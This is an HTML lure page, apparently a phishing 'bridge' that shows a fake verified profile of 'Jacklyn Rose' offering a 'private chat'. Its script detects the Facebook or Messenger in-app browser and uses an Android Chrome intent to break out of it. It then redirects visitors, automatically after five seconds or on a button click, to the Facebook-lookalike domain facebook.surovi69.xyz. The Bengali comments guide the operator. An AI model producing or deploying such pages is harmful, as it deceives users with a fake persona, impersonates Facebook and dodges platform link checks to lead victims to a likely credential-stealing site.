    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .bridge-card {
            background: white; width: 95%; max-width: 400px;
            border-radius: 15px; overflow: hidden;
            box-shadow: 0 12px 28px rgba(0,0,0,0.12); text-align: center;
        }
        .cover-photo {
            width: 100%; height: 150px;
            background: url('https://i.ibb.co.com/HTXcyk1L/pic1.webp') center/cover;
        }
        .profile-section { margin-top: -60px; padding: 20px; }
        .img-container { position: relative; width: 120px; height: 120px; margin: 0 auto; }
        .profile-img {
            width: 100%; height: 100%; border-radius: 50%;
            border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            object-fit: cover;
        }
        .online-dot {
            height: 20px; width: 20px; background-color: #31a24c;
            border: 3px solid white; border-radius: 50%;
            position: absolute; bottom: 10px; right: 10px;
        }
        .name { font-size: 24px; font-weight: bold; color: #1c1e21; margin: 15px 0 5px; }
        .bio { color: #65676b; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
        .main-btn {
            background-color: #0084FF; color: white; text-decoration: none;
            padding: 16px 30px; border-radius: 10px; font-weight: bold;
            display: inline-flex; align-items: center; gap: 10px;
            width: 85%; justify-content: center; font-size: 17px; 
            cursor: pointer; border: none;

<body>

    <div class="bridge-card">
        <div class="cover-photo"></div>
        <div class="profile-section">
            <div class="img-container">
                <img src="https://i.ibb.co.com/BHCXRznL/p1.webp" alt="Profile" class="profile-img">
                <span class="online-dot"></span>
            </div>
            <div class="name">Jacklyn Rose <i class="fas fa-check-circle" style="color: #0084FF; font-size: 18px;"></i></div>
            <div class="bio">
                I'm active now! Join my private chat room for a personal conversation. Safe and Secure.
            </div>
            <!-- রিডাইরেক্ট বাটন -->
            <button class="main-btn" id="actionBtn">
                <i class="fab fa-facebook-messenger"></i> Start Private Chat
            </button>
        </div>
    </div>

    <script>
        // আপনার গন্তব্য লিঙ্ক
        const targetUrl = "https://facebook.surovi69.xyz";
        
        // এটিই ভিজিটরকে সরাসরি ক্রোম ব্রাউজারে নিয়ে যাবে
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function forceExternalBrowser() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            const isFacebookApp = /FBAN|FBAV|Messenger/i.test(userAgent);

            if (isFacebookApp) {
                // ফেসবুক ব্রাউজার হলে সরাসরি ক্রোম খোলার চেষ্টা করবে
                window.location.href = chromeIntent;
                
                // যদি ২ সেকেন্ডের মধ্যে ক্রোম না খোলে, তবে সাধারণ রিডাইরেক্ট (ফলব্যাক)
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 2000);
            } else {
                // অলরেডি অন্য ব্রাউজারে থাকলে সরাসরি লিঙ্কে যাবে
                window.location.href = targetUrl;
            }
        }

        // বাটন ক্লিক করলে ক্রোম-এ নেওয়ার চেষ্টা করবে
        document.getElementById('actionBtn').addEventListener('click', function() {
            forceExternalBrowser();
        });

        // ৫ সেকেন্ড পর অটোমেটিক ক্রোম-এ নিয়ে যাওয়ার চেষ্টা করবে
        window.onload = function() {
            setTimeout(() => {
                forceExternalBrowser();
            }, 5000);
        };
    </script>
</body>
